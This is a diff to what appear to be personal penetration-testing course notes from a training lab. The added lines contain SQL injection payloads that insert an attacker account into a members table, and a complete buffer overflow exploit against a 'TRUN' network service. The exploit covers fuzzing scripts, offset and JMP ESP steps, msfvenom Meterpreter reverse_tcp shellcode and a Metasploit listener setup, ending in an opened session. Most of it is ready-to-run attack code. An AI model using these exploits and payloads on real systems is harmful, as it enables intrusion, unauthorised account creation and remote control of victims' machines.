@@ -436,7 +436,7 @@ UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.col
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Get edition SQL injection
-
+CREVjLhhneaXcpyHZ7W9
 ##Identify Vulnerable field 
 ?Selection=4 OR 1=1
 
@@ -448,6 +448,13 @@ Get edition SQL injection
 ## GOLDEN STATEMENT FROM BEFORE
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Accountname', 'AccountLname', 'User', 'Pass', 'email', 3) 
+
+John', 'field1', 'field2', 1) --(
+John', 'field1', 'field2', 1)
+John', 'field1', 'field2', 3) INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'lastin', 'userin', 'passin', 'emailin', 1) --
+
+John' INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'lastin', 'userin', 'passin', 'emailin', 1)' 
 
 TABLE NAMES SQL FLAGS
 sqlinjection- categories, members, orderlines, orders,payments,permissions,products,share4
@@ -732,15 +739,133 @@ buf += b"\x16\xd5\x2b\x2b\xbb\xac\xcd\x1e\xbb"
 
 \x33\x65\xf6\xf7
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+strings <vulnerable app>
+netstat -ant (find the port from strings)
+
+#!/usr/bin/env python
+
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 5000
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP
+s.connect (("10.50.33.77",9999)) #Define host and port
+print s.recv(1024) ## Print to screen the response
+s.send(buf) ## Send variable buf
+print s.recv(1024) ## Print to screen the response
+s.close() ## Close the socket
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+copy EIP to wiremask into find the offset to get the offset value
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Verify with BBBB that you are aiming in the right spot
+EIP should be 42424242 or BBBB
+
+#!/usr/bin/env python
+
+import socket
+
+buf = "TRUN /.:/"
+#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1A$
+buf += "A" * 2003
+buf += "BBBB"
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP
+s.connect (("10.50.33.77",9999)) #Define host and port
+print s.recv(1024) ## Print to screen the response
+s.send(buf) ## Send variable buf
+print s.recv(1024) ## Print to screen the response
+s.close() ## Close the socket
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+!mona modules 
+!mona jmp -r esp -m "essfunc.dll"
+		     ^^^^^^^^^^^ dll that the app is referencing
+*switch to window 2*
+
+These go in the debugger
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Make the hex block for the end of the variable buf
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.213 lport=4444 -b "\x00" -f python
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Set up a listener on Linops and sending the payload downrange
+
+Linops> msfconsole
+msf6> use multi/handler
+msf6 exploit(multi/handler)> show options
+msf6 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
+msf6> set LHOST 0.0.0.0
+msf6> set LPORT 4444
+msf6> exploit
+
+*should say something like : Started reverse TCP handler on 0.0.0.0:4444*
+
+
+linops> ./<script>
+
+
+
+*should say:* 
+Sending stage (175686 bytes) to 10.50.33.77
+[*] Meterpreter session 11 opened (192.168.65.20:4444 -> 10.50.33.77:3144) at 2024-12-02 15:37:37 +0000
+
+meterpreter >
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#!/usr/bin/env python
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+import socket
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+buf = "TRUN /.:/"
+#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac$
+buf += "A" * 2003
+#buf += "BBBB"
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 15
+buf += b"\xd9\xce\xbd\x1b\x89\x17\x70\xd9\x74\x24\xf4\x5b"
+buf += b"\x31\xc9\xb1\x59\x31\x6b\x19\x83\xeb\xfc\x03\x6b"
+buf += b"\x15\xf9\x7c\xeb\x98\x72\x7e\x14\x59\xec\xf6\xf1"
+buf += b"\x68\x3e\x6c\x71\xd8\x8e\xe6\xd7\xd1\x65\xaa\xc3"
+buf += b"\xe6\xce\x01\xca\xc9\xcf\x1d\x60\x02\x1e\xe2\x29"
+buf += b"\x6e\x01\x9e\x33\xa3\xe1\x9f\xfb\xb6\xe0\xd8\x4d"
+buf += b"\xbc\x0d\xb4\xc6\x6c\xc1\xb2\x9b\xac\xe0\x14\x90"
+buf += b"\x8d\x9a\xc3\x22\xcd\x2e\xa0\x2d\x1e\x45\x70\x36"
+buf += b"\x15\x01\xa1\x47\xfa\xe1\x24\x8e\x88\x3d\x6e\x20"
+buf += b"\x8e\xb6\x44\xc9\x71\x1e\x95\x0d\xdd\x5f\x19\x80"
+buf += b"\x1f\x98\x9e\x7b\x6a\xd2\xdc\x06\x6d\x21\x9e\xdc"
+buf += b"\xf8\xb5\x38\x96\x5b\x11\xb8\x7b\x3d\xd2\xb6\x30"
+buf += b"\x49\xbc\xda\xc7\x9e\xb7\xe7\x4c\x21\x17\x6e\x16"
+buf += b"\x06\xb3\x2a\xcc\x27\xe2\x96\xa3\x58\xf4\x7f\x1b"
+buf += b"\xfd\x7f\x6d\x4a\x81\x80\x6d\x73\xdf\x16\xa1\xbe"
+buf += b"\xe0\xe6\xad\xc9\x93\xd4\x72\x62\x3c\x54\xfa\xac"
+buf += b"\xbb\xed\xec\x4e\x13\x55\x7c\xb1\x94\xa5\x54\x76"
+buf += b"\xc0\xf5\xce\x5f\x69\x9e\x0e\x5f\xbc\x0a\x05\xf7"
+buf += b"\x35\xf8\x06\xd2\x22\xfe\x38\xcd\xee\x77\xde\xbd"
+buf += b"\x5e\xd7\x4f\x7e\x0f\x97\x3f\x16\x45\x18\x1f\x06"
+buf += b"\x66\xf3\x08\xad\x89\xad\x61\x5a\x33\xf4\xfa\xfb"
+buf += b"\xbc\x23\x87\x3c\x36\xc1\x77\xf2\xbf\xa0\x6b\xe3"
+buf += b"\xa7\x4a\x74\xf4\x4d\x4a\x1e\xf0\xc7\x1d\xb6\xfa"
+buf += b"\x3e\x69\x19\x04\x15\xea\x5e\xfa\xe8\xda\x15\xcd"
+buf += b"\x7e\x62\x42\x32\x6f\x62\x92\x64\xe5\x62\xfa\xd0"
+buf += b"\x5d\x31\x1f\x1f\x48\x26\x8c\x8a\x73\x1e\x60\x1c"
+buf += b"\x1c\x9c\x5f\x6a\x83\x5f\x8a\xe8\xc4\x9f\x48\xc7"
+buf += b"\x6c\xf7\xb2\x57\x8d\x07\xd9\x57\xdd\x6f\x16\x77"
+buf += b"\xd2\x5f\xd7\x52\xbb\xf7\x52\x33\x09\x66\x62\x1e"
+buf += b"\xcf\x36\x63\xad\xd4\xc9\x1e\xde\xeb\x2a\xdf\xf6"
+buf += b"\x8f\x2b\xdf\xf6\xb1\x10\x09\xcf\xc7\x57\x89\x74"
+buf += b"\xd7\xe2\xac\xdd\x72\x0c\xe2\x1e\x57"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IP$
+s.connect (("10.50.33.77",9999)) #Define host and port
+print s.recv(1024) ## Print to screen the response
+s.send(buf) ## Send variable buf
+print s.recv(1024) ## Print to screen the response
+s.close() ## Close the socket
+
+
+## Little Extra Note Space n Shit For the Notes and Not for the Hoes but also$
+## 625012A0 -> "\xA0\x12\x50\x62"
+## msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.213 lport=4444 -b "\x00" -f python
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
